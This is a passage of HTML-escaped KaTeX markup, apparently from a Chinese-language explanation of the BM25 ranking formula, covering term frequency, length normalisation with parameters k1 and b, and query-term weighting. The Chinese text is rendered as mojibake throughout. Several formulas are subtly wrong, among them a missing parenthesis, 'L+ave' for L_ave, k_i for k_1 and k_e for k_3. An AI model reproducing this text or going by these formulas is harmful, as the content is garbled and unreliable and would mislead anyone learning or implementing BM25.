mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose mtight&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.481108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mrow&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;K=k_i(1-b+b*\frac{L_d}{L+{ave}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.2975219999999998em;vertical-align:-0.403331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.894191em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.41586em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.403331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå…¶ä¸­&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tf_{td}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯å•è¯åœ¨æ–‡æ¡£dä¸­è¯é¢‘ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;L_d&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯æ–‡æ¡£dçš„é•¿åº¦ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;L_{ave}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯æ‰€æœ‰æ–‡æ¡£çš„å¹³å‡é•¿åº¦ï¼Œå˜é‡&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯ä¸€ä¸ªæ­£çš„å‚æ•°ï¼Œç”¨æ¥æ ‡å‡†åŒ–æ–‡ç« è¯é¢‘çš„èŒƒå›´ï¼Œå½“&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_1=0&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå°±æ˜¯ä¸€ä¸ªäºŒå…ƒæ¨¡å‹ï¼Œä¸€ä¸ªæ›´å¤§çš„å€¼å¯¹åº”ä½¿ç”¨æ›´åŸå§‹çš„è¯é¢‘ä¿¡æ¯ã€‚&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;b&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯å¦ä¸€ä¸ªå¯è°ƒå‚æ•°(0&amp;lt;b&amp;lt;1)ï¼Œå®ƒæ˜¯ç”¨å†³å®šä½¿ç”¨æ–‡æ¡£é•¿åº¦æ¥è¡¨ç¤ºä¿¡æ¯é‡çš„èŒƒå›´ï¼šå½“bä¸º1æ—¶ï¼Œæ—¶å®Œå…¨ä½¿ç”¨æ–‡æ¡£é•¿åº¦æ¥æƒè¡¡è¯çš„æƒé‡ï¼Œå½“bä¸º0è¡¨ç¤ºä¸ä½¿ç”¨æ–‡æ¡£é•¿åº¦ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;å•è¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ä¸queryä¹‹é—´çš„ç›¸ä¼¼æ€§ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“queryå¾ˆé•¿æ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åˆ»ç”»å•è¯ä¸queryä¹‹é—´çš„æƒé‡(å¯¹äºçŸ­çš„queryï¼Œè¿™ä¸€é¡¹ä¸æ˜¯å¿…é¡»çš„)ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S(q_i,Q)=\frac{(k_3+1)tf_{tq}}{k_e+tf_{tq}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 